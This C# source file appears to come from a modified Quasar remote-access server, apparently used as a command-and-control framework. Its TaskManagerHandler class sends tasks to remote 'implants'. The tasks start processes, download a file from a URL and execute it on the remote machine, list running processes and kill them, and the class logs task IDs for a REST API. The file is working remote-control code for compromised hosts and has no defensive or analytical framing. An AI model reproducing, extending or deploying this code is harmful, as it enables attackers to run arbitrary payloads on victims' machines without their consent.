using Quasar.Common.Enums;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using Quasar.Server.Tasking;
using System;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with remote tasks.
    /// </summary>
    public class TaskManagerHandler : MessageProcessorBase<Process[]>, IEquatable<TaskManagerHandler>
    {
        /// <summary>
        /// Represents the method that will handle the result of a process action.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="action">The process action which was performed.</param>
        /// <param name="result">The result of the performed process action.</param>
        public delegate void ProcessActionPerformedEventHandler(object sender, ProcessAction action, bool result);

        /// <summary>
        /// Raised when a result of a started process is received.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event ProcessActionPerformedEventHandler ProcessActionPerformed = null;

        /// <summary>
        /// Reports the result of a started process.
        /// </summary>
        /// <param name="action">The process action which was performed.</param>
        /// <param name="result">The result of the performed process action.</param>
        private void OnProcessActionPerformed(ProcessAction action, bool result)
        {
            SynchronizationContext.Post(r =>
            {
                var handler = ProcessActionPerformed;
                handler?.Invoke(this, action, (bool)r);
            }, result);
        }

        /// <summary>
        /// The client which is associated with this remote execution handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="TaskManagerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public TaskManagerHandler(Client client, bool viaRestApi = false) : base(true, viaRestApi)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is DoProcessResponse ||
                                                             message is GetProcessesResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoProcessResponse execResp:
                    Execute(sender, execResp);
                    break;
                case GetProcessesResponse procResp:
                    Execute(sender, procResp);
                    break;
            }
        }

        /// <summary>
        /// Starts a new process remotely. Returns created implant task ID.
        /// </summary>
        /// <param name="remotePath">The remote path used for starting the new process.</param>
        /// <param name="isUpdate">Decides whether the process is a client update.</param>
        public string StartProcess(
            string remotePath, 
            bool isUpdate = false,
            string processArgs = "", 
            bool useShellExecute = false, 
            bool captureOutput = false,
            bool noWindow = false
        ) {
            if (isUpdate)
            {
                throw new Exception("Updating implant no longer supported.");
            }
            DoProcessStart task = ImplantTaskManager.CreateAndRegisterExecuteProcessTask(
                remotePath, 
                "",
                processArgs: processArgs,
                useShellExecute: useShellExecute,
                captureOutput: captureOutput,
                noWindow: noWindow
            );
            Logger.Info(String.Format(
                "Created and registered new ExecuteProcess task with ID {0} to start process at filepath {1}", 
                task.TaskId, 
                task.FilePath
            ));
            _client.Send(task);
            return task.TaskId;
        }

        /// <summary>
        /// Downloads a file from the web and executes it remotely. Returns created implant task ID.
        /// </summary>
        /// <param name="url">The URL to download and execute.</param>
        /// <param name="isUpdate">Decides whether the file is a client update.</param>
        public string StartProcessFromWeb(
            string url, 
            bool isUpdate = false, 
            string downloadDest = "", 
            string processArgs = "", 
            bool useShellExecute = false, 
            bool captureOutput = false,
            bool noWindow = false
        ) {
            DoProcessStart task = ImplantTaskManager.CreateAndRegisterExecuteProcessTask(
                "", 
                url,
                downloadDest: downloadDest,
                processArgs: processArgs,
                useShellExecute: useShellExecute,
                captureOutput: captureOutput,
                noWindow: noWindow
            );
            Logger.Info(String.Format(
                "Created and registered new ExecuteProcess task with ID {0} to download and execute file from {1}", 
                task.TaskId, 
                task.DownloadUrl
            ));
            _client.Send(task);
            return task.TaskId;
        }

        /// <summary>
        /// Refreshes the current started processes.
        /// </summary>
        public void RefreshProcesses()
        {
            _client.Send(new GetProcesses());
        }

        /// <summary>
        /// Ends a started process given the process id.
        /// </summary>
        /// <param name="pid">The process id to end.</param>
        public void EndProcess(int pid)
        {
            _client.Send(new DoProcessEnd { Pid = pid });
        }

        private void Execute(ISender client, DoProcessResponse message)
        {
            Logger.Debug("Handling DoProcessResponse message with task ID " + message.TaskId);
            ImplantTaskManager.RegisterExecuteProcessTaskResponse(message);
            if (!viaRestApi)
            {
                OnProcessActionPerformed(message.Action, message.Result);
            }
        }

        private void Execute(ISender client, GetProcessesResponse message)
        {
            OnReport(message.Processes);
        }

        public bool Equals(TaskManagerHandler other)
        {
            return this._client == other._client && this.viaRestApi == other.viaRestApi;
        }
    }
}
